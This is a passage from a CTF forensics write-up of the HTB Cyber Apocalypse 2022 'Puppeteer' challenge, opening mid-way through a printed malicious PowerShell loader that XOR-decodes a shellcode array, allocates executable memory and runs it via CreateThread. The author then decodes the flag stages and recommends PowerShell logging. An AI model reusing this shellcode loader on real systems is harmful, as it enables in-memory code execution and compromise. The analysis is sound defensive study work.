class="nx">0x88</span><span class="p">,</span><span class="nx">0x90</span><span class="p">,</span><span class="nx">0x6b</span><span class="p">,</span><span class="nx">0xf8</span><span class="p">,</span><span class="nx">0x51</span><span class="p">,</span><span class="nx">0xba</span><span class="p">,</span><span class="nx">0xd1</span><span class="p">,</span><span class="nx">0x2e</span><span class="p">,</span><span class="nx">0x04</span><span class="p">,</span><span class="nx">0xbb</span><span class="p">,</span><span class="nx">0xdb</span><span class="p">,</span><span class="nx">0x90</span><span class="p">,</span><span class="nx">0x8f</span><span class="p">,</span><span class="nx">0x81</span><span class="p">,</span><span class="nx">0x81</span><span class="p">,</span><span class="nx">0x9c</span><span class="p">,</span><span class="nx">0xe0</span><span class="p">,</span><span class="nx">0x18</span><span class="p">,</span><span class="nx">0x9c</span><span class="p">,</span><span class="nx">0xe0</span><span class="p">,</span><span class="nx">0x11</span><span class="p">,</span><span class="nx">0x99</span><span class="p">,</span><span class="nx">0x2e</span><span class="p">,</span><span class="nx">0x11</span><span class="p">,</span><span class="nx">0x99</span><span class="p">,</span><span class="nx">0x58</span><span class="p">,</span><span class="nx">0x13</span><span class="p">,</span><span class="nx">0x99</span><span class="p">,</span><span class="nx">0x2e</span><span class="p">,</span><span class="nx">0x11</span><span class="p">,</span><span class="nx">0x99</span><span class="p">,</span><span class="nx">0x58</span><span class="p">,</span><span class="nx">0x10</span><span class="p">,</span><span class="nx">0x90</span><span class="p">,</span><span class="nx">0x6b</span><span class="p">,</span><span class="nx">0x3b</span><span class="p">,</span><span class="nx">0xde</span><span class="p">,</span><span class="nx">0x0e</span><span class="p">,</span><span class="nx">0x31</span><span class="p">,</span><span class="nx">0x2e</span><span class="p">,</span><span class="nx">0x04</span><span class="p">,</span><span class="nx">0x99</span><span class="p">,</span><span class="nx">0x58</span><span class="p">,</span><span class="nx">0x16</span><span class="p">,</span><span class="nx">0xbb</span><span class="p">,</span><span class="nx">0xc1</span><span class="p">,</span><span class="nx">0x90</span><span class="p">,</span><span class="nx">0x89</span><span class="p">,</span><span class="nx">0x9d</span><span class="p">,</span><span class="nx">0x58</span><span class="p">,</span><span class="nx">0x33</span><span class="p">,</span><span class="nx">0x99</span><span class="p">,</span><span class="nx">0x58</span><span class="p">,</span><span class="nx">0x28</span><span class="p">,</span><span class="nx">0x90</span><span class="p">,</span><span class="nx">0x6b</span><span class="p">,</span><span class="nx">0x48</span><span class="p">,</span><span class="nx">0x74</span><span class="p">,</span><span class="nx">0xa5</span><span class="p">,</span><span class="nx">0xb0</span><span class="p">,</span><span class="nx">0x2e</span><span class="p">,</span><span class="nx">0x04</span><span class="p">,</span><span class="nx">0x54</span><span class="p">,</span><span class="nx">0x11</span><span class="p">,</span><span class="nx">0xa5</span><span class="p">,</span><span class="nx">0xdb</span><span class="p">,</span><span class="nx">0x98</span><span class="p">,</span><span class="nx">0x2e</span><span class="p">,</span><span class="nx">0x1f</span><span class="p">,</span><span class="nx">0xa4</span><span class="p">,</span><span class="nx">0x34</span><span class="p">,</span><span class="nx">0x39</span><span class="p">,</span><span class="nx">0x42</span><span class="p">,</span><span class="nx">0xd1</span><span class="p">,</span><span class="nx">0xd1</span><span class="p">,</span><span class="nx">0xd1</span><span class="p">,</span><span class="nx">0x99</span><span class="p">,</span><span class="nx">0x52</span><span class="p">,</span><span class="nx">0x3d</span><span class="p">,</span><span class="nx">0xc1</span><span class="p">,</span><span class="nx">0x99</span><span class="p">,</span><span class="nx">0x58</span><span class="p">,</span><span class="nx">0x33</span><span class="p">,</span><span class="nx">0x9c</span><span class="p">,</span><span class="nx">0xe0</span><span class="p">,</span><span class="nx">0x18</span><span class="p">,</span><span class="nx">0xbb</span><span class="p">,</span><span class="nx">0xd5</span><span class="p">,</span><span class="nx">0x90</span><span class="p">,</span><span class="nx">0x89</span><span class="p">,</span><span class="nx">0x99</span><span class="p">,</span><span class="nx">0x58</span><span class="p">,</span><span class="nx">0x28</span><span class="p">,</span><span class="nx">0x90</span><span class="p">,</span><span class="nx">0x6b</span><span class="p">,</span><span class="nx">0xd3</span><span class="p">,</span><span class="nx">0x08</span><span class="p">,</span><span class="nx">0x19</span><span class="p">,</span><span class="nx">0x8e</span><span class="p">,</span><span class="nx">0x2e</span><span class="p">,</span><span class="nx">0x04</span><span class="p">,</span><span class="nx">0x52</span><span class="p">,</span><span class="nx">0x29</span><span class="p">,</span><span class="nx">0xd1</span><span class="p">,</span><span class="nx">0xaf</span><span class="p">,</span><span class="nx">0x84</span><span class="p">,</span><span class="nx">0x99</span><span class="p">,</span><span class="nx">0x52</span><span class="p">,</span><span class="nx">0x15</span><span class="p">,</span><span class="nx">0xf1</span><span class="p">,</span><span class="nx">0x8f</span><span class="p">,</span><span class="nx">0x58</span><span class="p">,</span><span class="nx">0x27</span><span class="p">,</span><span class="nx">0xbb</span><span class="p">,</span><span class="nx">0x91</span><span class="p">,</span><span class="nx">0x90</span><span class="p">,</span><span class="nx">0x88</span><span class="p">,</span><span class="nx">0xb9</span><span class="p">,</span><span class="nx">0xd1</span><span class="p">,</span><span class="nx">0xc1</span><span class="p">,</span><span class="nx">0xd1</span><span class="p">,</span><span class="nx">0xd1</span><span class="p">,</span><span class="nx">0x90</span><span class="p">,</span><span class="nx">0x89</span><span class="p">,</span><span class="nx">0x99</span><span class="p">,</span><span class="nx">0x58</span><span class="p">,</span><span class="nx">0x23</span><span class="p">,</span><span class="nx">0x99</span><span class="p">,</span><span class="nx">0xe0</span><span class="p">,</span><span class="nx">0x18</span><span class="p">,</span><span class="nx">0x90</span><span class="p">,</span><span class="nx">0x6b</span><span class="p">,</span><span class="nx">0x89</span><span class="p">,</span><span class="nx">0x75</span><span class="p">,</span><span class="nx">0x82</span><span class="p">,</span><span class="nx">0x34</span><span class="p">,</span><span class="nx">0x2e</span><span class="p">,</span><span class="nx">0x04</span><span class="p">,</span><span class="nx">0x99</span><span class="p">,</span><span class="nx">0x58</span><span class="p">,</span><span class="nx">0x12</span><span class="p">,</span><span class="nx">0x98</span><span class="p">,</span><span class="nx">0x58</span><span class="p">,</span><span class="nx">0x16</span><span class="p">,</span><span class="nx">0x9c</span><span class="p">,</span><span class="nx">0xe0</span><span class="p">,</span><span class="nx">0x18</span><span class="p">,</span><span class="nx">0x98</span><span class="p">,</span><span class="nx">0x58</span><span class="p">,</span><span class="nx">0x21</span><span class="p">,</span><span class="nx">0x99</span><span class="p">,</span><span class="nx">0x58</span><span class="p">,</span><span class="nx">0x0b</span><span class="p">,</span><span class="nx">0x99</span><span class="p">,</span><span class="nx">0x58</span><span class="p">,</span><span class="nx">0x28</span><span class="p">,</span><span class="nx">0x90</span><span class="p">,</span><span class="nx">0x6b</span><span class="p">,</span><span class="nx">0xd3</span><span class="p">,</span><span class="nx">0x08</span><span class="p">,</span><span class="nx">0x19</span><span class="p">,</span><span class="nx">0x8e</span><span class="p">,</span><span class="nx">0x2e</span><span class="p">,</span><span class="nx">0x04</span><span class="p">,</span><span class="nx">0x52</span><span class="p">,</span><span class="nx">0x29</span><span class="p">,</span><span class="nx">0xd1</span><span class="p">,</span><span class="nx">0xac</span><span class="p">,</span><span class="nx">0xf9</span><span class="p">,</span><span class="nx">0x89</span><span class="p">,</span><span class="nx">0x90</span><span class="p">,</span><span class="nx">0x86</span><span class="p">,</span><span class="nx">0x88</span><span class="p">,</span><span class="nx">0xb9</span><span class="p">,</span><span class="nx">0xd1</span><span class="p">,</span><span class="nx">0x91</span><span class="p">,</span><span class="nx">0xd1</span><span class="p">,</span><span class="nx">0xd1</span><span class="p">,</span><span class="nx">0x90</span><span class="p">,</span><span class="nx">0x89</span><span class="p">,</span><span class="nx">0xbb</span><span class="p">,</span><span class="nx">0xd1</span><span class="p">,</span><span class="nx">0x8b</span><span class="p">,</span><span class="nx">0x90</span><span class="p">,</span><span class="nx">0x6b</span><span class="p">,</span><span class="nx">0xda</span><span class="p">,</span><span class="nx">0xfe</span><span class="p">,</span><span class="nx">0xde</span><span class="p">,</span><span class="nx">0xe1</span><span class="p">,</span><span class="nx">0x2e</span><span class="p">,</span><span class="nx">0x04</span><span class="p">,</span><span class="nx">0x86</span><span class="p">,</span><span class="nx">0x88</span><span class="p">,</span><span class="nx">0x90</span><span class="p">,</span><span class="nx">0x6b</span><span class="p">,</span><span class="nx">0xa4</span><span class="p">,</span><span class="nx">0xbf</span><span class="p">,</span><span class="nx">0x9c</span><span class="p">,</span><span class="nx">0xb0</span><span class="p">,</span><span class="nx">0x2e</span><span class="p">,</span><span class="nx">0x04</span><span class="p">,</span><span class="nx">0x98</span><span class="p">,</span><span class="nx">0x2e</span><span class="p">,</span><span class="nx">0x1f</span><span class="p">,</span><span class="nx">0x38</span><span class="p">,</span><span class="nx">0xed</span><span class="p">,</span><span class="nx">0x2e</span><span class="p">,</span><span class="nx">0x2e</span><span class="p">,</span><span class="nx">0x2e</span><span class="p">,</span><span class="nx">0x99</span><span class="p">,</span><span class="nx">0xd0</span><span class="p">,</span><span class="nx">0x12</span><span class="p">,</span><span class="nx">0x99</span><span class="p">,</span><span class="nx">0xf8</span><span class="p">,</span><span class="nx">0x17</span><span class="p">,</span><span class="nx">0x99</span><span class="p">,</span><span class="nx">0x54</span><span class="p">,</span><span class="nx">0x27</span><span class="p">,</span><span class="nx">0xa4</span><span class="p">,</span><span class="nx">0x65</span><span class="p">,</span><span class="nx">0x90</span><span class="p">,</span><span class="nx">0x2e</span><span class="p">,</span><span class="nx">0x36</span><span class="p">,</span><span class="nx">0x89</span><span class="p">,</span><span class="nx">0xbb</span><span class="p">,</span><span class="nx">0xd1</span><span class="p">,</span><span class="nx">0x88</span><span class="p">,</span><span class="nx">0x98</span><span class="p">,</span><span class="nx">0x16</span><span class="p">,</span><span class="nx">0x13</span><span class="p">,</span><span class="nx">0x21</span><span class="p">,</span><span class="nx">0x64</span><span class="p">,</span><span class="nx">0x73</span><span class="p">,</span><span class="nx">0x87</span><span class="p">,</span><span class="nx">0x2e</span><span class="p">,</span><span class="nx">0x04</span><span class="p">;</span><span class="w">

</span><span class="p">[</span><span class="n">array</span><span class="p">]::</span><span class="n">Reverse</span><span class="p">(</span><span class="nv">$stage2</span><span class="p">);</span><span class="w">

</span><span class="nv">$hRffYLENA</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$tNZvQCljVk</span><span class="p">::</span><span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,[</span><span class="n">Math</span><span class="p">]::</span><span class="n">Max</span><span class="p">(</span><span class="nv">$HVOASfFuNSxRXR</span><span class="o">.</span><span class="nf">Length</span><span class="p">,</span><span class="mi">0</span><span class="n">x1000</span><span class="p">),</span><span class="mi">0</span><span class="n">x3000</span><span class="p">,</span><span class="nx">0x40</span><span class="p">);</span><span class="w">

</span><span class="nv">$stage3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$stage1</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nv">$stage2</span><span class="p">;</span><span class="w">

</span><span class="p">[</span><span class="n">System.Runtime.InteropServices.Marshal</span><span class="p">]::</span><span class="n">Copy</span><span class="p">(</span><span class="nv">$HVOASfFuNSxRXR</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="nv">$hRffYLENA</span><span class="p">,</span><span class="nv">$HVOASfFuNSxRXR</span><span class="o">.</span><span class="nf">Length</span><span class="p">);</span><span class="w">


</span><span class="c"># Unpack Shellcode;</span><span class="w">

</span><span class="kr">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="nv">$i</span><span class="w"> </span><span class="o">-lt</span><span class="w"> </span><span class="nv">$HVOASfFuNSxRXR</span><span class="o">.</span><span class="nf">count</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span><span class="w">
</span><span class="p">{</span><span class="w">
    </span><span class="nv">$HVOASfFuNSxRXR</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$HVOASfFuNSxRXR</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="w"> </span><span class="o">-bxor</span><span class="w"> </span><span class="mi">0</span><span class="n">xd1</span><span class="p">;</span><span class="w">
</span><span class="p">}</span><span class="w">

</span><span class="c">#Unpack Special Orders!</span><span class="w">

</span><span class="kr">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="w"> </span><span class="o">-lt</span><span class="w"> </span><span class="nv">$stage3</span><span class="o">.</span><span class="nf">count</span><span class="p">;</span><span class="nv">$i</span><span class="o">++</span><span class="p">){</span><span class="w">
    </span><span class="nv">$stage3</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$stage3</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="w"> </span><span class="o">-bxor</span><span class="w"> </span><span class="mi">0</span><span class="n">xd1</span><span class="p">;</span><span class="w">
</span><span class="p">}</span><span class="w">

</span><span class="nv">$tNZvQCljVk</span><span class="p">::</span><span class="n">CreateThread</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="nv">$hRffYLENA</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span><span class="w">
</span></pre></table></code></div></div><p>This looks like it’s going to contain the info we ned to solve the challenge.</p><h3 id="powershell-deobfuscation"><span class="mr-2">PowerShell DeObfuscation</span><a href="#powershell-deobfuscation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>I initially started trying to deobfuscate this head first and was getting a little overwhelmed. Then looking back over the code, I focused on the comments:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>...
# Unpack Shellcode;
...
# Unpack Special Orders;
...
</pre></table></code></div></div><p>Okay, so the massive byte array is the shellcode. I don’t think that’s going to reveal the flag. Plus it seems to be completely separate from the $stage1, $stage2, and $stage3 variables that are un-xor’d in the second for-loop. Deobfuscating that first looks a bit easier than going through all of shellcode, so I’ll focus on that first. If it doesn’t show anything promising, I’ll try deobfuscating the shellcode.</p><p>Deobfuscating the “Special Orders” only requires a few lines of PowerShell from the scriptblock:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="p">[</span><span class="n">byte</span><span class="p">[]]</span><span class="w"> </span><span class="nv">$stage1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="n">x99</span><span class="p">,</span><span class="w"> </span><span class="nx">0x85</span><span class="p">,</span><span class="w"> </span><span class="nx">0x93</span><span class="p">,</span><span class="w"> </span><span class="nx">0xaa</span><span class="p">,</span><span class="w"> </span><span class="nx">0xb3</span><span class="p">,</span><span class="w"> </span><span class="nx">0xe2</span><span class="p">,</span><span class="w"> </span><span class="nx">0xa6</span><span class="p">,</span><span class="w"> </span><span class="nx">0xb9</span><span class="p">,</span><span class="w"> </span><span class="nx">0xe5</span><span class="p">,</span><span class="w"> </span><span class="nx">0xa3</span><span class="p">,</span><span class="w"> </span><span class="nx">0xe2</span><span class="p">,</span><span class="w"> </span><span class="nx">0x8e</span><span class="p">,</span><span class="w"> </span><span class="nx">0xe1</span><span class="p">,</span><span class="w"> </span><span class="nx">0xb7</span><span class="p">,</span><span class="w"> </span><span class="nx">0x8e</span><span class="p">,</span><span class="w"> </span><span class="nx">0xa5</span><span class="p">,</span><span class="w"> </span><span class="nx">0xb9</span><span class="p">,</span><span class="w"> </span><span class="nx">0xe2</span><span class="p">,</span><span class="w"> </span><span class="nx">0x8e</span><span class="p">,</span><span class="w"> </span><span class="nx">0xb3</span><span class="p">;</span><span class="w">
</span><span class="p">[</span><span class="n">byte</span><span class="p">[]]</span><span class="w"> </span><span class="nv">$stage2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="n">xac</span><span class="p">,</span><span class="w"> </span><span class="nx">0xff</span><span class="p">,</span><span class="w"> </span><span class="nx">0xff</span><span class="p">,</span><span class="w"> </span><span class="nx">0xff</span><span class="p">,</span><span class="w"> </span><span class="nx">0xe2</span><span class="p">,</span><span class="w"> </span><span class="nx">0xb2</span><span class="p">,</span><span class="w"> </span><span class="nx">0xe0</span><span class="p">,</span><span class="w"> </span><span class="nx">0xa5</span><span class="p">,</span><span class="w"> </span><span class="nx">0xa2</span><span class="p">,</span><span class="w"> </span><span class="nx">0xa4</span><span class="p">,</span><span class="w"> </span><span class="nx">0xbb</span><span class="p">,</span><span class="w"> </span><span class="nx">0x8e</span><span class="p">,</span><span class="w"> </span><span class="nx">0xb7</span><span class="p">,</span><span class="w"> </span><span class="nx">0xe1</span><span class="p">,</span><span class="w"> </span><span class="nx">0x8e</span><span class="p">,</span><span class="w"> </span><span class="nx">0xe4</span><span class="p">,</span><span class="w"> </span><span class="nx">0xa5</span><span class="p">,</span><span class="w"> </span><span class="nx">0xe1</span><span class="p">,</span><span class="w"> </span><span class="nx">0xe1</span><span class="p">;</span><span class="w">

</span><span class="p">[</span><span class="n">array</span><span class="p">]::</span><span class="n">Reverse</span><span class="p">(</span><span class="nv">$stage2</span><span class="p">);</span><span class="w">

</span><span class="c">#Unpack Special Orders!</span><span class="w">

</span><span class="kr">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="w"> </span><span class="o">-lt</span><span class="w"> </span><span class="nv">$stage3</span><span class="o">.</span><span class="nf">count</span><span class="p">;</span><span class="nv">$i</span><span class="o">++</span><span class="p">){</span><span class="w">
    </span><span class="nv">$stage3</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$stage3</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="w"> </span><span class="o">-bxor</span><span class="w"> </span><span class="mi">0</span><span class="n">xd1</span><span class="p">;</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><p>We can actually just copy and paste this into PowerShell ISE, add a <code class="language-plaintext highlighter-rouge">Write-Output $stage3</code> at the end and it should give us the output we need.</p><p><img data-src="/assets/img/post_images/ctf/htb-ca-2022/forensics/puppeteer/snapshot6.jpg" alt="" data-proofer-ignore></p><p>The output appears to be in decimal, so we can take this and paste it into CyberChef. CyberChef will pick up on the format and suggest to decode it for us by clicking the magic wand next to “Output”.</p><p><img data-src="/assets/img/post_images/ctf/htb-ca-2022/forensics/puppeteer/snapshot7.jpg" alt="" data-proofer-ignore></p><h3 id="conclusions"><span class="mr-2">Conclusions</span><a href="#conclusions" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>PowerShell logging is incredibly valuable. I use it when running Dynamic Malware Analysis to see what commands PowerShell executed. It is handy in solving some of these HTB challenges so if you have a Windows VM that you use for malware analysis or monitoring endpoints with PowerShell, I highly recommend making sure PowerShell event logging is enabled.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/ctf/'>CTF</a>, <a href='/categories/htb-ca-2022/'>HTB CA 2022</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/ctf/" class="post-tag no-text-decoration" >ctf</a> <a href="/tags/htbca2022/" class="post-tag no-text-decoration" >htbca2022</a> <a href="/tags/htb/" class="post-tag no-text-decoration" >htb</a> <a href="/tags/forensics/" class="post-tag no-text-decoration" >forensics</a> <a href="/tags/hackthebox/" class="post-tag no-text-decoration" >hackthebox</a> <a href="/tags/powershell/" class="post-tag no-text-decoration" >powershell</a> <a href="/tags/evtx/" class="post-tag no-text-decoration" >evtx</a> <a href="/tags/evt/" class="post-tag no-text-decoration" >evt</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=HTB Cyber Apocalypse CTF - Forensics - Puppeteer - Gore-Ez-Knee&amp;url=https://gore-ez-knee.github.io/posts/htb-ca-2022-forensics-puppeteer/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=HTB Cyber Apocalypse CTF - Forensics - Puppeteer - Gore-Ez-Knee&amp;u=https://gore-ez-knee.github.io/posts/htb-ca-2022-forensics-puppeteer/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://gore-ez-knee.github.io/posts/htb-ca-2022-forensics-puppeteer/&amp;text=HTB Cyber Apocalypse CTF - Forensics - Puppeteer - Gore-Ez-Knee" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Update</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/kali-cloud-novnc/">Stream Kali Linux to your Browser from AWS</a><li><a href="/posts/backup-restore-gitlab/">Backup/Restore GitLab</a><li><a href="/posts/getting-started-cybersecurity/">Intro to Cybersecurity</a><li><a href="/posts/htb-ca-2022-writeup-table/">HTB Cyber Apocalypse CTF - Table of Write-ups</a><li><a href="/posts/elastic-install/">Quickstart Elastic Stack</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/aws/">aws</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/gitlab/">gitlab</a> <a class="post-tag" href="/tags/ubuntu/">ubuntu</a> <a class="post-tag" href="/tags/docker-compose/">docker-compose</a> <a class="post-tag" href="/tags/elastic/">elastic</a> <a class="post-tag" href="/tags/elasticsearch/">elasticsearch</a> <a class="post-tag" href="/tags/evt/">evt</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/htb-ca-2022-writeup-table/"><div class="card-body"> <em class="timeago small" data-ts="1652643000" > 2022-05-15 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HTB Cyber Apocalypse CTF - Table of Write-ups</h3><div class="text-muted small"><p> I’m hosting the files I was able to get on DropBox in case anyone wanted to try the challenges on their own after the fact. I’ll add more write-ups as I find them. Web Challenge Na...</p></div></div></a></div><div class="card"> <a href="/posts/ready/"><div class="card-body"> <em class="timeago small" data-ts="1645333200" > 2022-02-19 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Ready</h3><div class="text-muted small"><p> Ready Enumeration $ sudo nmap -sC -sV -oA nmap/ready 10.10.10.220 Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-04 23:50 EDT Nmap scan report for 10.10.10.220 Host is up (0.066s latency). N...</p></div></div></a></div><div class="card"> <a href="/posts/kali-cloud-novnc/"><div class="card-body"> <em class="timeago small" data-ts="1664118000" > 2022-09-25 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Stream Kali Linux to your Browser from AWS</h3><div class="text-muted small"><p> Have you ever wanted to: Stand up an instance of a Kali desktop environment in the cloud to perform testing? Spin up a Linux desktop environment to bypass workspace restrictions? Browse webs...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/elastic-install/" class="btn btn-outline-primary" prompt="Older"><p>Quickstart Elastic Stack</p></a> <a href="/posts/htb-ca-2022-writeup-table/" class="btn btn-outline-primary" prompt="Newer"><p>HTB Cyber Apocalypse CTF - Table of Write-ups</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/gore_ez_knee">Gore-Ez-Knee</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/aws/">aws</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/gitlab/">gitlab</a> <a class="post-tag" href="/tags/ubuntu/">ubuntu</a> <a class="post-tag" href="/tags/docker-compose/">docker-compose</a> <a class="post-tag" href="/tags/elastic/">elastic</a> <a class="post-tag" href="/tags/elasticsearch/">elasticsearch</a> <a class="post-tag" href="/tags/evt/">evt</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-BJ7S2G5H9F"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-BJ7S2G5H9F'); }); </script>
